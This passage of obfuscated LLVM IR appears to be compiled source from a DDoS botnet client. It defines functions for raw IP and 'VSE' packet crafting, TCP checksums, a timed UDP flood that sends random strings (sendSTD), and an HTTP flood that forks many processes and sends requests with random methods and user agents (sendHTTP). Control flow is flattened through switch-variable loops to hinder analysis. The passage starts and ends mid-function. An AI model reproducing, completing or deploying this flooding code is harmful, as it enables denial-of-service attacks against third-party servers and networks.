  %28 = load i16*, i16** %9, align 8
  %29 = load i16, i16* %28, align 2
  %30 = zext i16 %29 to i32
  %31 = load i32, i32* %12, align 4
  %32 = add i32 %31, %30
  store i32 %32, i32* %12, align 4
  %33 = load i16*, i16** %9, align 8
  %34 = getelementptr inbounds i16, i16* %33, i32 1
  store i16* %34, i16** %9, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sub nsw i32 %35, 2
  store i32 %36, i32* %8, align 4
  store i32 1073205259, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, 1
  %40 = select i1 %39, i32 -733574725, i32 242885252
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i16*, i16** %9, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = load i32, i32* %12, align 4
  %47 = add i32 %46, %45
  store i32 %47, i32* %12, align 4
  store i32 242885252, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %10, align 4
  %50 = lshr i32 %49, 16
  %51 = and i32 %50, 65535
  %52 = load i32, i32* %12, align 4
  %53 = add i32 %52, %51
  store i32 %53, i32* %12, align 4
  %54 = load i32, i32* %10, align 4
  %55 = and i32 %54, 65535
  %56 = load i32, i32* %12, align 4
  %57 = add i32 %56, %55
  store i32 %57, i32* %12, align 4
  %58 = load i32, i32* %11, align 4
  %59 = lshr i32 %58, 16
  %60 = and i32 %59, 65535
  %61 = load i32, i32* %12, align 4
  %62 = add i32 %61, %60
  store i32 %62, i32* %12, align 4
  %63 = load i32, i32* %11, align 4
  %64 = and i32 %63, 65535
  %65 = load i32, i32* %12, align 4
  %66 = add i32 %65, %64
  store i32 %66, i32* %12, align 4
  %67 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %68 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %67, i32 0, i32 6
  %69 = load i8, i8* %68, align 1
  %70 = zext i8 %69 to i16
  %71 = call zeroext i16 @htons(i16 zeroext %70) #13
  %72 = zext i16 %71 to i32
  %73 = load i32, i32* %12, align 4
  %74 = add i32 %73, %72
  store i32 %74, i32* %12, align 4
  %75 = load i16, i16* %7, align 2
  %76 = zext i16 %75 to i32
  %77 = load i32, i32* %12, align 4
  %78 = add i32 %77, %76
  store i32 %78, i32* %12, align 4
  store i32 1866023001, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %12, align 4
  %81 = lshr i32 %80, 16
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 1286520347, i32 951464578
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %12, align 4
  %86 = and i32 %85, 65535
  %87 = load i32, i32* %12, align 4
  %88 = lshr i32 %87, 16
  %89 = add i32 %86, %88
  store i32 %89, i32* %12, align 4
  store i32 1866023001, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %12, align 4
  %92 = xor i32 %91, -1
  %93 = trunc i32 %92 to i16
  ret i16 %93

loopEnd:                                          ; preds = %84, %79, %48, %41, %37, %27, %23, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @makeVSEPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i32 0, i32 0), i8** %11, align 8
  %13 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %14 = bitcast %struct.iphdr* %13 to i8*
  %15 = load i8, i8* %14, align 4
  %16 = and i8 %15, -16
  %17 = or i8 %16, 5
  store i8 %17, i8* %14, align 4
  %18 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %19 = bitcast %struct.iphdr* %18 to i8*
  %20 = load i8, i8* %19, align 4
  %21 = and i8 %20, 15
  %22 = or i8 %21, 64
  store i8 %22, i8* %19, align 4
  %23 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %24 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %23, i32 0, i32 1
  store i8 0, i8* %24, align 1
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = add i64 20, %26
  %28 = load i32, i32* %12, align 4
  %29 = sext i32 %28 to i64
  %30 = add i64 %27, %29
  %31 = trunc i64 %30 to i16
  %32 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %33 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %32, i32 0, i32 2
  store i16 %31, i16* %33, align 2
  %34 = call i32 @rand_cmwc()
  %35 = trunc i32 %34 to i16
  %36 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %37 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %36, i32 0, i32 3
  store i16 %35, i16* %37, align 4
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 4
  store i16 0, i16* %39, align 2
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 5
  store i8 -1, i8* %41, align 4
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 6
  store i8 %42, i8* %44, align 1
  %45 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %46 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %45, i32 0, i32 7
  store i16 0, i16* %46, align 2
  %47 = load i32, i32* %8, align 4
  %48 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 8
  store i32 %47, i32* %49, align 4
  %50 = load i32, i32* %7, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 9
  store i32 %50, i32* %52, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1080577969, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1080577969, label %first
    i32 -1563971435, label %7
    i32 -2093834381, label %8
    i32 -784414292, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 -1563971435, i32 -2093834381
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -784414292, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 -784414292, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 114694534, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 114694534, label %first
    i32 -145484894, label %14
    i32 -1082123732, label %15
    i32 614753431, label %38
    i32 734028827, label %39
    i32 -181886209, label %45
    i32 -640327681, label %46
    i32 2110565433, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %12 = icmp eq %struct.hostent* %.reload, null
  %13 = select i1 %12, i32 -145484894, i32 -1082123732
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 2110565433, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.hostent*, %struct.hostent** %6, align 8
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %16, i32 0, i32 4
  %18 = load i8**, i8*** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %22 = bitcast %struct.in_addr* %21 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 3
  %25 = load i32, i32* %24, align 4
  %26 = sext i32 %25 to i64
  call void @bcopy(i8* %20, i8* %22, i64 %26) #2
  %27 = load i16, i16* %5, align 2
  %28 = call zeroext i16 @htons(i16 zeroext %27) #13
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = bitcast i32* %8 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 6, i32 1, i8* %33, i32 4) #2
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 614753431, i32 734028827
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 2110565433, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 -181886209, i32 -640327681
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 2110565433, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %3, align 4
  store i32 2110565433, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %3, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %39, %38, %15, %14, %first, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #2
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 1954635392, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1954635392, label %39
    i32 835705218, label %49
    i32 1323427314, label %64
    i32 1537843053, label %67
    i32 1515700298, label %68
    i32 -1613863590, label %71
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #2
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  %48 = select i1 %47, i32 835705218, i32 1515700298
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %7, align 4
  %51 = load i8*, i8** %13, align 8
  %52 = call i64 @send(i32 %50, i8* %51, i64 50, i32 0)
  %53 = load i32, i32* %7, align 4
  %54 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %55 = call i32 @connect(i32 %53, %struct.sockaddr* %54, i32 16)
  %56 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %57 = sext i32 %56 to i64
  %58 = load i64, i64* %8, align 8
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = icmp sge i64 %57, %61
  %63 = select i1 %62, i32 1323427314, i32 1537843053
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* %7, align 4
  %66 = call i32 @close(i32 %65)
  call void @_exit(i32 0) #12
  unreachable

; <label>:67:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1515700298, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %11, align 4
  %70 = add i32 %69, 1
  store i32 %70, i32* %11, align 4
  store i32 1954635392, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %68, %67, %49, %39, %switchDefault
  br label %loopEntry
}

declare i32 @time(...) #3

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [1 x i8], align 1
  %11 = alloca [512 x i8], align 16
  %12 = alloca [3 x i8*], align 16
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %9, align 8
  %17 = bitcast [3 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %17, i8* bitcast ([3 x i8*]* @sendHTTP.methods to i8*), i64 24, i32 16, i1 false)
  %18 = bitcast [3 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %18, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %19 = call i32 @getdtablesize() #2
  %20 = sdiv i32 %19, 2
  store i32 %20, i32* %14, align 4
  store i32 0, i32* %7, align 4
  %switchVar = alloca i32
  store i32 -1473478789, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1473478789, label %21
    i32 -321254494, label %26
    i32 861862649, label %30
    i32 353596736, label %31
    i32 1691640045, label %39
    i32 -1102554406, label %108
    i32 540538533, label %117
    i32 -261760403, label %118
    i32 2126010016, label %119
    i32 -2114555680, label %120
    i32 134624088, label %123
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %14, align 4
  %24 = icmp slt i32 %22, %23
  %25 = select i1 %24, i32 -321254494, i32 134624088
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = call i32 @fork() #2
  %28 = icmp eq i32 %27, 0
  %29 = select i1 %28, i32 861862649, i32 2126010016
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 353596736, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i32, i32* %5, align 4
  %34 = trunc i32 %33 to i16
  %35 = call i32 @socket_connect(i8* %32, i16 zeroext %34)
  store i32 %35, i32* %8, align 4
  %36 = load i32, i32* %8, align 4
  %37 = icmp ne i32 %36, 0
  %38 = select i1 %37, i32 1691640045, i32 -1102554406
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %41 = call i8* @strcpy(i8* %40, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0)) #2
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %43 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %44 = call i64 @strlen(i8* %43) #10
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = call i32 @rand() #2
  %47 = sext i32 %46 to i64
  %48 = urem i64 %47, 3
  %49 = getelementptr inbounds [3 x i8*], [3 x i8*]* %12, i64 0, i64 %48
  %50 = load i8*, i8** %49, align 8
  %51 = call i8* @strcpy(i8* %45, i8* %50) #2
  %52 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %54 = call i64 @strlen(i8* %53) #10
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = call i8* @strcpy(i8* %55, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.81, i32 0, i32 0)) #2
  %57 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %59 = call i64 @strlen(i8* %58) #10
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8*, i8** %4, align 8
  %62 = call i8* @strcpy(i8* %60, i8* %61) #2
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %64 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %65 = call i64 @strlen(i8* %64) #10
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = call i8* @strcpy(i8* %66, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.82, i32 0, i32 0)) #2
  %68 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %69 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %70 = call i64 @strlen(i8* %69) #10
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = call i32 @rand() #2
  %73 = sext i32 %72 to i64
  %74 = urem i64 %73, 32
  %75 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %74
  %76 = load i8*, i8** %75, align 8
  %77 = call i8* @strcpy(i8* %71, i8* %76) #2
  %78 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %79 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %80 = call i64 @strlen(i8* %79) #10
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
